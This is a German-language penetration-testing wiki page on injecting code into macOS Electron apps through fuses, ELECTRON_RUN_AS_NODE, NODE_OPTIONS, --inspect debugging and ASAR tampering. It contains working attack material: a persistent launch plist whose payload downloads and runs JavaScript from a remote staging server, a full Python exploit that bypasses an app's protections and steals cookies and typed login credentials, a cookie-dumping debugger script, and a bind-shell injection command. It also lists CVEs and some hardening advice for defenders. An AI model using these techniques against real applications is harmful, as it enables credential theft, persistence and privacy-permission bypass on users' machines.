# Injection in macOS-Electron-Anwendungen

{{#include ../../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Wenn du nicht weißt, was Electron ist, findest du [**hier viele Informationen**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Vorerst musst du nur wissen, dass Electron **node** ausführt.\
Und node verfügt über bestimmte **Parameter** und **Umgebungsvariablen**, mit denen es dazu gebracht werden kann, neben der angegebenen Datei **anderen Code auszuführen**.

### Electron Fuses

Diese Techniken werden im Folgenden erläutert. In jüngster Zeit hat Electron jedoch mehrere **Sicherheitsflags hinzugefügt, um sie zu verhindern**. Dies sind die [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses). Die folgenden werden verwendet, um zu verhindern, dass Electron-Apps unter macOS **beliebigen Code laden**:<sup>[[1]](#references)</sup>

- **`RunAsNode`**: Wenn deaktiviert, verhindert dies die Verwendung der Umgebungsvariablen **`ELECTRON_RUN_AS_NODE`**, um Code einzuschleusen.
- **`EnableNodeCliInspectArguments`**: Wenn deaktiviert, werden Parameter wie `--inspect` und `--inspect-brk` nicht berücksichtigt. Dadurch wird diese Möglichkeit zur Code-Injection verhindert.
- **`EnableEmbeddedAsarIntegrityValidation`**: Wenn aktiviert, wird die geladene **`asar`**-**Datei** von macOS **validiert**. Dadurch wird **Code-Injection** durch das Ändern des Inhalts dieser Datei **verhindert**.
- **`OnlyLoadAppFromAsar`**: Wenn dies aktiviert ist, wird nicht in der folgenden Reihenfolge nach einer Anwendung gesucht: **`app.asar`**, **`app`** und schließlich **`default_app.asar`**. Stattdessen wird nur `app.asar` überprüft und verwendet. Dadurch wird sichergestellt, dass es in **Kombination** mit dem Fuse **`embeddedAsarIntegrityValidation`** **unmöglich** ist, **nicht validierten Code zu laden**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Wenn aktiviert, verwendet der Browser-Prozess die Datei `browser_v8_context_snapshot.bin` für seinen V8-Snapshot.

Ein weiteres interessantes Fuse, das Code-Injection nicht verhindert, ist:

- **EnableCookieEncryption**: Wenn aktiviert, wird der Cookie-Speicher auf der Festplatte mithilfe von kryptografischen Schlüsseln auf Betriebssystemebene verschlüsselt.

### Electron Fuses überprüfen

Du kannst diese Flags in einer Anwendung wie folgt **überprüfen**:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modifying Electron Fuses

Wie in der [**Dokumentation erwähnt**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), wird die Konfiguration der **Electron Fuses** innerhalb des **Electron binary** vorgenommen, das irgendwo den String **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** enthält.<sup>[[1]](#references)</sup>

In macOS-Anwendungen befindet sich dieser typischerweise unter `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Du könntest diese Datei in [https://hexed.it/](https://hexed.it/) laden und nach dem vorherigen String suchen. Nach diesem String siehst du in ASCII eine Zahl „0“ oder „1“, die angibt, ob jede fuse deaktiviert oder aktiviert ist. Ändere einfach den Hex-Code (`0x30` ist `0` und `0x31` ist `1`), um die **fuse-Werte zu ändern**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Beachte, dass die App nicht ausgeführt werden kann, wenn du versuchst, die **`Electron Framework`-Binärdatei** innerhalb einer Anwendung mit diesen geänderten Bytes zu **überschreiben**.

## RCE durch Hinzufügen von Code zu Electron Applications

Es könnte **externe JS/HTML-Dateien** geben, die eine Electron App verwendet. Ein Angreifer könnte daher Code in diese Dateien einschleusen, deren Signatur nicht geprüft wird, und beliebigen Code im Kontext der App ausführen.

> [!CAUTION]
> Allerdings gibt es derzeit 2 Einschränkungen:
>
> - Die Berechtigung **`kTCCServiceSystemPolicyAppBundles`** ist **erforderlich**, um eine App zu ändern, daher ist dies standardmäßig nicht mehr möglich.
> - Die kompilierte **`asap`-Datei** hat normalerweise die fuses **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** aktiviert.
>
> Dadurch wird dieser Angriffspfad komplizierter (oder unmöglich).

Beachte, dass sich die Anforderung von **`kTCCServiceSystemPolicyAppBundles`** umgehen lässt, indem die Anwendung in ein anderes Verzeichnis (wie **`/tmp`**) kopiert, der Ordner **`app.app/Contents`** in **`app.app/NotCon`** umbenannt, die **asar**-Datei mit deinem **bösartigen** Code geändert, anschließend wieder in **`app.app/Contents`** umbenannt und die Anwendung ausgeführt wird.<sup>[[5]](#references)</sup>

Du kannst den Code aus der asar-Datei mit folgendem Befehl entpacken:
```bash
npx asar extract app.asar app-decomp
```
Und packe es nach der Änderung wieder mit:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE mit ELECTRON_RUN_AS_NODE

Laut [**der Dokumentation**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node) wird der Prozess als normaler Node.js-Prozess gestartet, wenn diese Umgebungsvariable gesetzt ist.<sup>[[6]](#references)</sup>
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Wenn der Fuse **`RunAsNode`** deaktiviert ist, wird die Umgebungsvariable **`ELECTRON_RUN_AS_NODE`** ignoriert, und dies funktioniert nicht.

### Injection aus der App-Plist

Wie [**hier vorgeschlagen**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), könntest du diese Umgebungsvariable in einer Plist missbrauchen, um Persistenz aufrechtzuerhalten:<sup>[[2]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE mit `NODE_OPTIONS`

Du kannst die Payload in einer anderen Datei speichern und sie ausführen:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> Wenn der Fuse **`EnableNodeOptionsEnvironmentVariable`** **deaktiviert** ist, ignoriert die App die Umgebungsvariable **NODE_OPTIONS** beim Start, es sei denn, die Umgebungsvariable **`ELECTRON_RUN_AS_NODE`** ist gesetzt. Diese wird ebenfalls ignoriert, wenn der Fuse **`RunAsNode`** **deaktiviert** ist.
>
> Wenn Sie **`ELECTRON_RUN_AS_NODE`** nicht setzen, wird der folgende **Fehler** angezeigt: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Injection aus der App-Plist

Sie können diese Umgebungsvariable in einer Plist missbrauchen, um durch das Hinzufügen dieser Schlüssel Persistence aufrechtzuerhalten:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE mit inspecting

Laut [**diesem**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) wird ein **debug port geöffnet**, wenn du eine Electron-Anwendung mit Flags wie **`--inspect`**, **`--inspect-brk`** und **`--remote-debugging-port`** ausführst. Dadurch kannst du dich damit verbinden (zum Beispiel über Chrome unter `chrome://inspect`) und **Code injizieren** oder sogar neue Prozesse starten.<sup>[[7]](#references)</sup>\
Zum Beispiel:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
In [**diesem Blogpost**](https://hackerone.com/reports/1274695) wird dieses Debugging missbraucht, um einen Headless Chrome dazu zu bringen, **beliebige Dateien an beliebigen Orten herunterzuladen**.<sup>[[8]](#references)</sup>

> [!TIP]
> Falls eine App eine eigene Methode verwendet, um zu prüfen, ob Umgebungsvariablen oder Parameter wie `--inspect` gesetzt sind, könntest du versuchen, dies zur Laufzeit mit dem Argument `--inspect-brk` zu **umgehen**, wodurch die **Ausführung** am Anfang der App **angehalten** wird und ein Bypass ausgeführt werden kann (beispielsweise durch Überschreiben der Argumente oder Umgebungsvariablen des aktuellen Prozesses).

Das Folgende war ein Exploit, bei dem es durch das Überwachen und Ausführen der App mit dem Parameter `--inspect-brk` möglich war, den benutzerdefinierten Schutz zu umgehen (durch Überschreiben der Parameter des Prozesses, um `--inspect-brk` zu entfernen) und anschließend einen JS-Payload zu injizieren, um Cookies und Credentials aus der App zu dumpen:
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> Wenn die Fuse **`EnableNodeCliInspectArguments`** deaktiviert ist, ignoriert die App beim Start **Node-Parameter** (wie `--inspect`), sofern die Umgebungsvariable **`ELECTRON_RUN_AS_NODE`** nicht gesetzt ist. Diese wird ebenfalls ignoriert, wenn die Fuse **`RunAsNode`** deaktiviert ist.
>
> Du könntest jedoch weiterhin den **Electron-Parameter `--remote-debugging-port=9229`** verwenden, aber der vorherige Payload wird nicht funktionieren, um andere Prozesse auszuführen.

Mit dem Parameter **`--remote-debugging-port=9222`** ist es möglich, einige Informationen aus der Electron App zu stehlen, etwa den **Verlauf** (mit GET-Befehlen) oder die **Cookies** des Browsers (da diese im Browser **entschlüsselt** werden und es einen **JSON-Endpunkt** gibt, der sie zurückgibt).

Wie das funktioniert, erfährst du [**hier**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) und [**hier**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f). Du kannst das automatische Tool [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) oder ein einfaches Script verwenden, zum Beispiel:<sup>[[9]](#references)[[10]](#references)</sup>
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### Injection aus der App-Plist

Du könntest diese Umgebungsvariable in einer plist missbrauchen, um durch das Hinzufügen dieser Schlüssel Persistence aufrechtzuerhalten:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC-Bypass durch Ausnutzen älterer Versionen

> [!TIP]
> Der TCC-Daemon von macOS überprüft die ausgeführte Version der Anwendung nicht. Wenn du also mit keiner der vorherigen Techniken **Code in eine Electron-Anwendung injizieren kannst**, könntest du eine frühere Version der APP herunterladen und Code in diese injizieren, da sie weiterhin die TCC-Berechtigungen erhält (sofern der Trust Cache dies nicht verhindert).

## Nicht-JS-Code ausführen

Die vorherigen Techniken ermöglichen es dir, **JS-Code innerhalb des Prozesses der Electron-Anwendung auszuführen**. Denke jedoch daran, dass die **Kindprozesse unter demselben Sandbox-Profil** wie die übergeordnete Anwendung laufen und deren **TCC-Berechtigungen erben**.\
Wenn du daher beispielsweise Entitlements missbrauchen möchtest, um auf die Kamera oder das Mikrofon zuzugreifen, könntest du einfach **eine andere Binärdatei aus dem Prozess heraus ausführen**.

## Bedeutende Electron-macOS-Schwachstellen (2023-2024)

### CVE-2023-44402 – ASAR-Integritäts-Bypass

Electron ≤22.3.23 und verschiedene 23-27 Pre-Releases ermöglichten es einem Angreifer mit Schreibzugriff auf den Ordner `.app/Contents/Resources`, die Fuses `embeddedAsarIntegrityValidation` **und** `onlyLoadAppFromAsar` zu umgehen. Der Fehler war eine *Verwechslung des Dateityps* im Integritätsprüfer, wodurch ein präpariertes **Verzeichnis namens `app.asar`** anstelle des validierten Archivs geladen werden konnte. Dadurch wurde beliebiger JavaScript-Code in diesem Verzeichnis beim Start der Anwendung ausgeführt. Selbst Anbieter, die den Hardening-Empfehlungen gefolgt waren und beide Fuses aktiviert hatten, waren unter macOS daher weiterhin verwundbar.<sup>[[3]](#references)</sup>

Gepatchte Electron-Versionen: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** und **27.0.0-alpha.7**. Angreifer, die eine Anwendung mit einem älteren Build finden, können `Contents/Resources/app.asar` durch ihr eigenes Verzeichnis ersetzen, um Code mit den TCC-Entitlements der Anwendung auszuführen.<sup>[[3]](#references)</sup>

### 2024-„RunAsNode“-/„enableNodeCliInspectArguments“-CVE-Cluster

Im Januar 2024 machte eine Reihe von CVEs (CVE-2024-23738 bis CVE-2024-23743) deutlich, dass viele Electron-Anwendungen die Fuses **RunAsNode** und **EnableNodeCliInspectArguments** weiterhin aktiviert ausliefern. Ein lokaler Angreifer kann das Programm daher mit der Umgebungsvariable `ELECTRON_RUN_AS_NODE=1` oder Flags wie `--inspect-brk` erneut starten, um es in einen *generischen* Node.js-Prozess umzuwandeln und alle Sandbox- und TCC-Berechtigungen der Anwendung zu übernehmen.<sup>[[4]](#references)</sup>

Obwohl das Electron-Team die Einstufung als „kritisch“ zurückwies und darauf hinwies, dass ein Angreifer bereits lokale Codeausführung benötigt, ist das Problem während der Post-Exploitation weiterhin nützlich, da es jedes verwundbare Electron-Bundle in eine *Living-off-the-Land*-Binärdatei verwandelt, die beispielsweise auf Kontakte, Fotos oder andere sensible Ressourcen zugreifen kann, für die der Desktop-Anwendung zuvor Berechtigungen erteilt wurden.<sup>[[4]](#references)</sup>

Defensive Empfehlungen der Electron-Maintainer:<sup>[[4]](#references)</sup>

* Deaktiviere die Fuses `RunAsNode` und `EnableNodeCliInspectArguments` in Production-Builds.
* Verwende die neuere **UtilityProcess**-API, wenn deine Anwendung legitimerweise einen Node.js-Hilfsprozess benötigt, anstatt diese Fuses wieder zu aktivieren.

## Automatische Injection

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

Das Tool [**electroniz3r**](https://github.com/r3ggi/electroniz3r) kann einfach verwendet werden, um **verwundbare Electron-Anwendungen** zu finden, die installiert sind, und Code in sie zu injizieren. Dieses Tool versucht, die **`--inspect`**-Technik zu verwenden:<sup>[[5]](#references)</sup>

Du musst es selbst kompilieren und kannst es folgendermaßen verwenden:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki wurde entwickelt, um Electron-Anwendungen zu backdooren, indem die JavaScript-Dateien der Anwendungen durch die Loki Command-&-Control-JavaScript-Dateien ersetzt werden.

## Referenzen

- [1] [Electron Fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [macOS Injection über Third-Party-Frameworks - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [ASAR-Integritätsumgehung durch Verwechslung des Dateityps (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] [Stellungnahme zu „runAsNode“-CVEs - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - ELECTRONizing macOS Privacy - Eine neue Waffe für Ihr Red Teaming-Arsenal - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [Umgebungsvariablen | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Warum Electron-Apps Ihre Secrets nicht vertraulich speichern können: --inspect-Option](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [HackerOne-Bericht Nr. 1274695 - Electron-Debugging missbraucht, um beliebige Dateien herunterzuladen](https://hackerone.com/reports/1274695)
- [9] [Hands in the Cookie Jar: Cookies mit Chromiums Remote-Debugger-Port dumpen - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Fehler beim Cookie-Dumping mit Chromiums Remote-Debugger beheben - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)

{{#include ../../../banners/hacktricks-training.md}}
